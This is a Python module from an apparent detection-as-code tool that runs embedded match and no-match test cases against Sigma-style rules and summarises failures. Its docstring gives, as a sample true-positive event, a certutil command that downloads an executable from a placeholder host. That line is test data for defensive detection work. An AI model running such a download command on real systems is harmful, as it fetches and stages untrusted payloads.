"""Detection-as-code: run the test cases embedded in each rule.

A rule may carry a ``tests`` block (a sigmalite extension; other Sigma
tooling ignores unknown top-level keys)::

    tests:
      match:      # events the rule MUST fire on (true positives)
        - {Image: 'C:\\Windows\\System32\\certutil.exe', CommandLine: 'certutil -urlcache -f http://x/a.exe'}
      no_match:   # events the rule must NOT fire on (known benign look-alikes)
        - {Image: 'C:\\Windows\\System32\\certutil.exe', CommandLine: 'certutil -hashfile a.iso SHA256'}

Running these in CI catches the two classic detection-engineering
regressions: a tuning change that silently stops the rule firing, and a
broadened pattern that starts firing on benign activity.
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Iterable

from .rule import Rule


@dataclass
class CaseResult:
    rule_title: str
    kind: str  # "match" | "no_match"
    index: int
    passed: bool
    event: dict


@dataclass
class TestReport:
    results: list[CaseResult] = field(default_factory=list)
    untested: list[str] = field(default_factory=list)

    @property
    def failures(self) -> list[CaseResult]:
        return [r for r in self.results if not r.passed]

    @property
    def ok(self) -> bool:
        return not self.failures

    def summary(self) -> str:
        passed = len(self.results) - len(self.failures)
        lines = [f"{passed}/{len(self.results)} detection test cases passed"]
        for f in self.failures:
            expectation = "should fire but did not" if f.kind == "match" else "fired on a benign event"
            lines.append(f"  FAIL  {f.rule_title} [{f.kind}#{f.index}]: {expectation} -> {f.event}")
        if self.untested:
            lines.append(f"  WARN  {len(self.untested)} rule(s) have no test cases: {', '.join(self.untested)}")
        return "\n".join(lines)


def run_rule_tests(rules: Iterable[Rule]) -> TestReport:
    report = TestReport()
    for rule in rules:
        cases = [("match", e) for e in rule.tests.get("match", [])] + \
                [("no_match", e) for e in rule.tests.get("no_match", [])]
        if not cases:
            report.untested.append(rule.title)
            continue
        counters = {"match": 0, "no_match": 0}
        for kind, event in cases:
            fired = rule.matches(event)
            report.results.append(CaseResult(
                rule_title=rule.title, kind=kind, index=counters[kind],
                passed=fired if kind == "match" else not fired, event=event,
            ))
            counters[kind] += 1
    return report
